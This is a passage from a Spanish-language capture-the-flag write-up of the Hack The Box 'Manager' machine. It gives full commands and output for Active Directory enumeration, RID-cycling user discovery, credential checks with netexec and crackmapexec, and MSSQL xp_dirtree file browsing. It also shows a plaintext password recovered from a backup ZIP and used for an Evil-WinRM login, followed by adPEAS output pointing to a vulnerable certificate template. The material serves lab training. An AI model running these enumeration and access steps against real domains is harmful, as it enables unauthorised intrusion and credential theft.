group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
```
No veo algún grupo que se vea vulnerable.

Veamos si hay más usuarios administradores:
```batch
rpcclient $> querygroup 0x200
        Group Name:     Domain Admins
        Description:    Designated administrators of the domain
        Group Attribute:7
        Num Members:1
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Sun, 13 Oct 2024 06:15:37 CST
        Logoff Time              :      Wed, 31 Dec 1969 18:00:00 CST
        Kickoff Time             :      Wed, 31 Dec 1969 18:00:00 CST
        Password last set Time   :      Thu, 27 Jul 2023 09:24:36 CST
        Password can change Time :      Fri, 28 Jul 2023 09:24:36 CST
        Password must change Time:      Wed, 13 Sep 30828 20:48:05 CST
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00004210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000081
        padding1[0..7]...
        logon_hrs[0..21]...
```
Solamente hay un usuario administrador.

Por último, veamos la información de todos los usuarios:
```batch
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xfeb RID: 0x45a acb: 0x00000210 Account: Cheng  Name: (null)    Desc: (null)
index: 0xfef RID: 0x45e acb: 0x00000210 Account: ChinHae        Name: (null)    Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000214 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfee RID: 0x45d acb: 0x00000210 Account: JinWoo Name: (null)    Desc: (null)
index: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xff0 RID: 0x45f acb: 0x00000210 Account: Operator       Name: (null)    Desc: (null)
index: 0xfed RID: 0x45c acb: 0x00000210 Account: Raven  Name: (null)    Desc: (null)
index: 0xfec RID: 0x45b acb: 0x00000210 Account: Ryan   Name: (null)    Desc: (null)
index: 0xfea RID: 0x459 acb: 0x00000210 Account: Zhong  Name: (null)    Desc: (null)
```
Nada, no hay algo que nos ayude.

### Enumeración de Servicio LDAP con ldapdomaindump {#LDAP}

Como ya tenemos un usuario y contraseña válidos, vamos a descargar el contenido del **servicio LDAP**.

Esto lo realizamos con la herramienta **ldapdomaindump**:
```bash
ldapdomaindump -u 'manager.htb\operator' -p 'operator' 10.10.11.236
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Abre un servidor en **Python** para que podamos ver los archivos **HTML** en el **localhost**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Visitemos el **localhost**:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura5.png">
</p>

Veamos los usuarios:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura6.png">
</p>

Ahí está el **usuario operator**, pero lo interesante, es el **usuario raven**, ya que pertenece al grupo **Remote Management Users**, es decir, se puede conectar vía **WinRM**:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura7.png">
</p>

Es lo más que podemos obtener, pero es una buena forma de enumerar usuarios, grupos, etc.

### Aplicando RID Cycling Attack para Enumeración de Usuarios con crackmapexec y rpcclient {#RID}

¿Qué es el **RID Cycling Attack**?

| **RID Cycling Attack** |
|:-----------:|
| *El ataque RID Cycling es una técnica utilizada para enumerar cuentas de usuario en un sistema Windows que forma parte de un dominio Active Directory o está configurado para responder a solicitudes SMB (Server Message Block). RID es el acrónimo de Relative Identifier (Identificador Relativo), que es parte del SID (Security Identifier) en sistemas Windows. En el RID Cycling, un atacante aprovecha la predictibilidad del RID en sistemas Windows para descubrir cuentas de usuario válidas. La idea es consultar el servidor SMB (u otro servicio) y utilizar el SID base conocido del sistema junto con diferentes valores de RID (comenzando desde valores conocidos como 500, 1000, etc.) para obtener el nombre de usuario asociado con ese RID. A través de una serie de consultas automáticas, el atacante puede "ciclar" o iterar sobre los valores de RID para enumerar cuentas de usuario.* |

| **RID** |
|:-----------:|
| *Cada cuenta en un sistema Windows está asociada a un SID, que es un identificador único que representa a un objeto de seguridad (por ejemplo, un usuario, grupo o computadora). El SID tiene dos partes importantes: SID Base/Security Identifier Base (esta parte es común a todas las cuentas del dominio o sistema) y RID/Relative Identifier (Esta es la parte que varía y es única para cada objeto. Por ejemplo, la cuenta del administrador por defecto siempre tendrá un RID 500, y las cuentas de usuario regulares comienzan con un RID de 1000).* |

Imaginemos que no hubiéramos podido obtener algún usuario válido.

En dado caso, podríamos intentar aplicar el **RID Cycling Attack** para obtener los usuarios por su **SID**.

Esto lo podemos lograr usando los comandos **lookupnames y lookupsids**. Los puedes encontrar si usas el comando help dentro del **servicio RPC**:
```batch
rpcclient -U "" 10.10.11.236 -N
rpcclient $> help
---------------         ----------------------
       UNIXINFO
       getpwuid         Get shell and homedir
       uidtosid         Convert uid to sid
---------------         ----------------------
         MDSSVC
fetch_properties                Fetch connection properties
fetch_attributes                Fetch attributes for a CNID
...
...
...
---------------         ----------------------
      LSARPC-DS
  dsroledominfo         Get Primary Domain Information
---------------         ----------------------
         LSARPC
       lsaquery         Query info policy
     lookupsids         Convert SIDs to names
    lookupsids3         Convert SIDs to names
lookupsids_level                Convert SIDs to names
    lookupnames         Convert names to SIDs
   lookupnames4         Convert names to SIDs
lookupnames_level               Convert names to SIDs
      enumtrust         Enumerate trusted domains
      enumprivs         Enumerate privileges
    getdispname         Get the privilege name
     lsaenumsid         Enumerate the LSA SIDS
...
...
...
```
Ahí lo tenemos.

Probemos primero con el comando **lookupnames** para buscar al administrador en la sesión nula:
```batch
rpcclient -U "" 10.10.11.236 -N -c "lookupnames administrator"
result was NT_STATUS_ACCESS_DENIED
```
No nos dejó.

Normalmente, existe un **usuario Guest** en todos los **AD**.

Probemos si funciona con este usuario sin indicarle una contraseña:
```batch
rpcclient -U "guest%" 10.10.11.236 -c "lookupnames administrator"
administrator S-1-5-21-4078382237-1492182817-2568127209-500 (User: 1)
```
Funciona, obtuvimos el **SID** del **usuario administrador**.

Ahora busquemos ese **SID** para ver cómo nos representa al usuario:
```batch
rpcclient -U "guest%" 10.10.11.236 -c "lookupsids S-1-5-21-4078382237-1492182817-2568127209-500"
S-1-5-21-4078382237-1492182817-2568127209-500 MANAGER\Administrator (1)
```
Los últimos 3 dígitos son los que representan al usuario.

Entonces, podemos jugar con este **SID** para agregar distintos dígitos y así obtener los usuarios registrados usando un rango específico.

Lo haremos usando un oneliner en el que pondremos una secuencia de 400 a 2000 dígitos, usaremos **xargs** para usar 50 hilos que ejecuten el comando en paralelo (`-P`), a su vez agregando la secuencia al final del **SID** (`-I {}`), y con **grep** vamos a eliminar un resultado que se repite al no encontrar un usuario válido, este resultado se muestra como **unknown**:

Probémoslo:
```batch
seq 400 2000 | xargs -P 50 -I {} rpcclient -U "guest%" 10.10.11.236 -c "lookupsids S-1-5-21-4078382237-1492182817-2568127209-{}" | grep -v "unknown"
S-1-5-21-4078382237-1492182817-2568127209-498 MANAGER\Enterprise Read-only Domain Controllers (2)
S-1-5-21-4078382237-1492182817-2568127209-501 MANAGER\Guest (1)
S-1-5-21-4078382237-1492182817-2568127209-500 MANAGER\Administrator (1)
S-1-5-21-4078382237-1492182817-2568127209-502 MANAGER\krbtgt (1)
S-1-5-21-4078382237-1492182817-2568127209-513 MANAGER\Domain Users (2)
S-1-5-21-4078382237-1492182817-2568127209-514 MANAGER\Domain Guests (2)
S-1-5-21-4078382237-1492182817-2568127209-516 MANAGER\Domain Controllers (2)
S-1-5-21-4078382237-1492182817-2568127209-512 MANAGER\Domain Admins (2)
S-1-5-21-4078382237-1492182817-2568127209-517 MANAGER\Cert Publishers (4)
S-1-5-21-4078382237-1492182817-2568127209-519 MANAGER\Enterprise Admins (2)
S-1-5-21-4078382237-1492182817-2568127209-515 MANAGER\Domain Computers (2)
S-1-5-21-4078382237-1492182817-2568127209-518 MANAGER\Schema Admins (2)
S-1-5-21-4078382237-1492182817-2568127209-526 MANAGER\Key Admins (2)
S-1-5-21-4078382237-1492182817-2568127209-525 MANAGER\Protected Users (2)
S-1-5-21-4078382237-1492182817-2568127209-521 MANAGER\Read-only Domain Controllers (2)
S-1-5-21-4078382237-1492182817-2568127209-522 MANAGER\Cloneable Domain Controllers (2)
S-1-5-21-4078382237-1492182817-2568127209-520 MANAGER\Group Policy Creator Owners (2)
S-1-5-21-4078382237-1492182817-2568127209-527 MANAGER\Enterprise Key Admins (2)
S-1-5-21-4078382237-1492182817-2568127209-553 MANAGER\RAS and IAS Servers (4)
S-1-5-21-4078382237-1492182817-2568127209-572 MANAGER\Denied RODC Password Replication Group (4)
S-1-5-21-4078382237-1492182817-2568127209-571 MANAGER\Allowed RODC Password Replication Group (4)
S-1-5-21-4078382237-1492182817-2568127209-1000 MANAGER\DC01$ (1)
S-1-5-21-4078382237-1492182817-2568127209-1101 MANAGER\DnsAdmins (4)
S-1-5-21-4078382237-1492182817-2568127209-1102 MANAGER\DnsUpdateProxy (2)
S-1-5-21-4078382237-1492182817-2568127209-1103 MANAGER\SQLServer2005SQLBrowserUser$DC01 (4)
S-1-5-21-4078382237-1492182817-2568127209-1114 MANAGER\Cheng (1)
S-1-5-21-4078382237-1492182817-2568127209-1116 MANAGER\Raven (1)
S-1-5-21-4078382237-1492182817-2568127209-1113 MANAGER\Zhong (1)
S-1-5-21-4078382237-1492182817-2568127209-1115 MANAGER\Ryan (1)
S-1-5-21-4078382237-1492182817-2568127209-1119 MANAGER\Operator (1)
S-1-5-21-4078382237-1492182817-2568127209-1117 MANAGER\JinWoo (1)
S-1-5-21-4078382237-1492182817-2568127209-1118 MANAGER\ChinHae (1)
```
Muy bien, obtuvimos los usuarios.

Esto también lo podemos aplicar con **crackmapexec**, usando al mismo usuario **guest** y el parámetro `--rid-brute`:
```bash
crackmapexec smb 10.10.11.236 -u "guest" -p "" --rid-brute
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\guest: 
SMB         10.10.11.236    445    DC01             [+] Brute forcing RIDs
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```
Hemos aplicado este ataque con exito.

### Probando Credenciales Válidas con netexec {#netexec}

Si bien podemos usar **crackmapexec** para probar en distintos servicios las credenciales que encontremos, no siempre obtendremos una validación, aunque sepamos que dichas credenciales sí son válidas.

Servicios como **LDAP y MSSQL** nos pueden dar un error al probar las credenciales con **crackmapexec**. Aunque no estoy seguro si esto es debido a configuraciones o políticas en estos servicios, podemos ocupar la herramienta **netexec** para validar credenciales en estos servicios.

| **Herramienta netexec** |
|:-----------:|
| *Es una herramienta de explotación de servicios de red que ayuda a automatizar la evaluación de la seguridad de grandes redes. NetExec es la continuación de CrackMapExec, que fue mantenido por mpgn durante años, pero se interrumpió tras la jubilación de mpgn.* |

Ejecútala:
```bash
netexec
usage: netexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL]
               [--verbose] [--debug] [--no-progress] [--log LOG] [-6]
               [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT]
               [--version]
               {ldap,wmi,winrm,ftp,mssql,rdp,smb,ssh,vnc} ...
     .   .
    .|   |.     _   _          _     _____

    ||   ||    | \ | |   ___  | |_  | ____| __  __   ___    ___
    \\( )//    |  \| |  / _ \ | __| |  _|   \ \/ /  / _ \  / __|
    .=[ ]=.    | |\  | |  __/ | |_  | |___   >  <  |  __/ | (__
   / /ॱ-ॱ\ \   |_| \_|  \___|  \__| |_____| /_/\_\  \___|  \___|
   ॱ \   / ॱ
     ॱ   ॱ

    The network execution tool
    Maintained as an open source project by @NeffIsBack, @MJHallenbeck, @_zblurx
    
    For documentation and usage examples, visit: https://www.netexec.wiki/

    Version : 1.2.0
    Codename: ItsAlwaysDNS
    Commit  : Kali Linux
```

Probemos con **netexec** el usuario y contraseña **operator** hacia el **servicio LDAP**:
```bash
netexec ldap manager.htb -u 'operator' -p 'operator'
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.236    389    DC01             [+] manager.htb\operator:operator
```
Funciona, nos indica que son válidas.

Ahora con el **servicio MSSQL**:
```bash
netexec mssql manager.htb -u 'operator' -p 'operator'
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator
```
Excelente.

Es bueno tener otra opción con la que podamos trabajar contra servicios que nos pueden dar problemas.

Aquí puedes encontrar ejemplos de uso para esta herramienta:
* <a href="https://medium.com/@nantysean/enumerating-a-corporate-network-with-netexec-7be7537b537d" target="_blank">Enumerating a Corporate Network with NetExec</a>

### Enumeración de Servicio MSSQL {#MSSQL}

Como ya vimos que el usuario y contraseña **operator** se pueden usar en el **servicio MSSQL**, vamos a entrar a este servicio usando la herramienta **mssqlclient de impacket**.

Le indicaremos el dominio, las credenciales válidas y la IP de la máquina víctima:
```bash
impacket-mssqlclient manager.htb/operator:operator@10.10.11.236
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'operator'.
```
Nos dio un error.

Es posible que esto pueda ocurrir cuando no le indicamos que se debe autenticar para **Windows**:
```sql
impacket-mssqlclient manager.htb/operator:operator@10.10.11.236 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)>
```
Ahora sí nos dejó.

Veamos si podemos ejecutar comandos con **xp_cmdshell**:
```sql 
SQL (MANAGER\Operator  guest@master)> xp_cmdshell "whoami"
ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```
No podemos.

Podemos buscar qué comandos podemos ejecutar:
```sql 
SQL (MANAGER\Operator  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```
Bien, nos permite habilitar el **xp_cmdshell**, enumerar bases de datos, usuarios, qué usuarios se pueden suplantar, etc.

Tratemos de habilitar el **xp_cmdshell**:
```sql 
SQL (MANAGER\Operator  guest@master)> enamble_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 1: Could not find stored procedure 'enamble_xp_cmdshell'.
```
Parece que no tenemos los permisos suficientes.

Enumeremos las bases de datos:
```sql 
SQL (MANAGER\Operator  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1
```
Solo hay una y no hay mucho que hacer ahí.

Enumeremos que usuarios pueden ser suplantados:
```sql 
SQL (MANAGER\Operator  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
SQL (MANAGER\Operator  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
------------------   --------   ---------   ---------   -------------   ----------   -----   
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   

guest                public     NULL        NULL        guest           b'2         '   b'00'   

INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   

sys                  public     NULL        NULL        NULL            b'4         '    NULL
```
Tenemos 4 usuarios, pero no hay manera de suplantarlos de momento.

Como nos vamos quedando sin opciones, podemos utilizar la herramienta **xp_dirtree** para enumerar los archivos del sistema a los que tenga permiso el **usuario operator**.

### Enumeración de Archivos del Sistema con xp_dirtree {#XPdirtree}

| **xp_dirtree** |
|:-----------:|
| *Es un procedimiento almacenado extendido en Microsoft SQL Server que se utiliza para enumerar directorios y archivos en un servidor. Este procedimiento toma como argumento una ruta del sistema de archivos y devuelve una lista de los directorios y archivos contenidos en esa ubicación. Muy útil para enumerar directorios y archivos dentro de una ruta en el sistema de archivos del servidor SQL Server, auditar archivos y directorios presentes en el servidor de base de datos, y verificar la estructura de archivos para automatizar ciertas tareas de administración, como la copia de seguridad o el mantenimiento de archivos.* |

Usemos la herramienta:
```sql 
SQL (MANAGER\Operator  guest@master)> xp_dirtree
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   

Documents and Settings          1      0   

inetpub                         1      0   

PerfLogs                        1      0   

Program Files                   1      0   

Program Files (x86)             1      0   

ProgramData                     1      0   

Recovery                        1      0   

SQL2019                         1      0   

System Volume Information       1      0   

Users                           1      0   

Windows                         1      0
```
Funciona, parece que nos está mostrando los directorios de la ruta `C:\` de **Windows**.

Podemos movernos entre directorio. Si vamos al directorio **Users** veremos que ahí está el **usuario raven**. Si recuerdas, este usuario se puede conectar mediante **WinRM**:
```sql 
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\Users
subdirectory    depth   file   
-------------   -----   ----   
Administrator       1      0   

All Users           1      0   

Default             1      0   

Default User        1      0   

Public              1      0   

Raven               1      0
```

Una ruta que podemos investigar es la que almacena la página web. Esta se encuentra en el directorio **wwwroot** dentro del directorio **inetpub**.

Chequémoslo:
```sql 
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub
subdirectory   depth   file   
------------   -----   ----   
custerr            1      0   

history            1      0   

logs               1      0   

temp               1      0   

wwwroot            1      0
```
Ahí esta.

Veamos su contenido:
```sql 
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1
```
Parece que podemos ver los archivos que componen a la página web, pero parece que ahí se encuentra un **archivo ZIP** que es un **backup**.

#### Analizando Contenido de Archivo ZIP y Ganando Acceso a la Máquina con Evil-WinRM {#ZIP}

Probemos si existe esa ruta en la página web:

<p align="center">
<img src="/assets/images/htb-writeup-manager/Captura8.png">
</p>

Sí existe, nos descargó el **archivo ZIP**.

Vamos a descomprimirlo con **unzip**:
```bash
ls -la
drwxr-xr-x root         root          4.0 KB Sat Oct 12 19:31:08 2024 .
drwxr-xr-x root         root          4.0 KB Sun Oct 13 02:41:13 2024 ..
.rw-r--r-- root         root          698 B  Thu Jul 27 05:35:54 2023 .old-conf.xml
.rw-r--r-- root         root          5.3 KB Thu Jul 27 05:32:30 2023 about.html
.rw-r--r-- root         root          5.2 KB Thu Jul 27 05:32:14 2023 contact.html
drwxr-xr-x root         root          4.0 KB Sat Oct 12 19:31:08 2024 css
drwxr-xr-x root         root          4.0 KB Sat Oct 12 19:31:08 2024 images
.rw-r--r-- root         root           18 KB Thu Jul 27 05:32:22 2023 index.html
drwxr-xr-x root         root          4.0 KB Sat Oct 12 19:31:08 2024 js
.rw-r--r-- root         root          7.7 KB Thu Jul 27 05:32:08 2023 service.html
.rw-rw-r-- berserkwings berserkwings 1021 KB Sat Oct 12 19:28:58 2024 website-backup-27-07-23-old.zip
```
Observa que hay un **archivo oculto XML**.

Veamos su contenido:
```xml
cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```
Increíble, quién sabe por qué razón se les ocurrió tener ahí una contraseña.

Comprobemos si esa contraseña es válida para el **usuario raven** como lo menciona el **archivo oculto XML** usando **crackmapexec**:
```bash
crackmapexec smb 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123
```
Parece que sí es.

Ahora probemos si sirve con **WinRM**:
```bash
crackmapexec winrm 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```
Muy bien, si funciona.

Entremos a la máquina usando **Evil-WinRM**:
```batch
evil-winrm -i 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami
manager\raven
```
Estamos dentro.

Busca la flag:
```batch
*Evil-WinRM* PS C:\Users\Raven\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Raven\Desktop> dir

    Directory: C:\Users\Raven\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/13/2024  12:10 AM             34 user.txt

*Evil-WinRM* PS C:\Users\Raven\Desktop> type user.txt
```
Tenemos la flag del usuario.

## Post Explotación {#Post}

### Enumeración de AD con adPEAS {#adPEAS}

Como siempre, la idea es enumerar el **AD** con **BloodHound y SharpHound** (lo haremos más adelante también) para encontrar un vector de ataque que nos ayude a escalar privilegios, pero en este caso, vamos a usar la herramienta **adPEAS**, que es similar a los **PEAS** que enumeran la máquina y encuentran vulnerabilidades.

Lo puedes obtener aquí:
* <a href="https://github.com/61106960/adPEAS" target="_blank">Repositorio de 61106960: adPEAS</a>

Una vez que lo tengas, cárgalo a la sesión de **Evil-WinRM**.

Ya sabes que hay 2 formas de hacerlo, yo lo cargué usando **Evil-WinRM**:
```batch
*Evil-WinRM* PS C:\Users\Raven\Documents> upload adPEAS/adPEAS.ps1
                                        
Info: Uploading ../content/adPEAS/adPEAS.ps1 to C:\Users\Raven\Documents\adPEAS.ps1
                                        
Data: 4655524 bytes of 4655524 bytes copied
                                        
Info: Upload successful!
```

Ya dentro, lo cargamos como un módulo y lo ejecutamos:
```batch
*Evil-WinRM* PS C:\Users\Raven\Documents> Import-Module .\adPEAS.ps1
*Evil-WinRM* PS C:\Users\Raven\Documents> Invoke-adPEAS

               _ _____  ______           _____

              | |  __ \|  ____|   /\    / ____|
      ____  __| | |__) | |__     /  \  | (___
     / _  |/ _  |  ___/|  __|   / /\ \  \___ \

    | (_| | (_| | |    | |____ / ____ \ ____) |
     \__,_|\__,_|_|    |______/_/    \_\_____/
                                            Version 0.8.24
                                                                                                                                                                                                                 
    Active Directory Enumeration
    by @61106960

    Legend
        [?] Searching for juicy information
        [!] Found a vulnerability which may can be exploited in some way
        [+] Found some interesting information for further investigation
        [*] Some kind of note
        [#] Some kind of secure configuration

[?] +++++ Searching for Juicy Active Directory Information +++++                                                                                                                                                 

[?] +++++ Checking General Domain Information +++++                                                                                                                                                              
[+] Found general Active Directory domain information for domain 'manager.htb':
Domain Name:                            manager.htb
Domain SID:                             S-1-5-21-4078382237-1492182817-2568127209
Domain Functional Level:                Windows 2016
Forest Name:                            manager.htb
Forest Children:                        No Subdomain[s] available
Domain Controller:                      dc01.manager.htb

[?] +++++ Searching for Vulnerable Certificate Templates +++++                                                                                                                                                   
adPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy

[?] +++++ Checking Template 'SubCA' +++++                                                                                                                                                                        
[!] Template 'SubCA' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
Template Name:                          SubCA
Template distinguishedname:             CN=SubCA,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=manager,DC=htb
Date of Creation:                       07/27/2023 10:31:05
EnrollmentFlag:                         0
[!] CertificateNameFlag:                ENROLLEE_SUPPLIES_SUBJECT
```
Analiza bien el resultado.

Nos muestra que hay una plantilla de un certificado que es vulnerable. La plantilla se llama **SubCA** y nos menciona que podemos usar la herramienta **certify o certipy**, para explotar esta vulnerabilidad.

En mi caso, voy a usar **certipy**.

### Enumeración de AD con BloodHound y SharpHound {#BloodH}

Aunque ya tenemos una vulnerabilidad que podemos explotar, vamos a probar qué podemos obtener con **BloodHound y SharpHound**.

Carga **SharpHound** a la sesión actual:
```batch
*Evil-WinRM* PS C:\Users\Raven\Documents\BH> upload SharpHound.exe
                                        
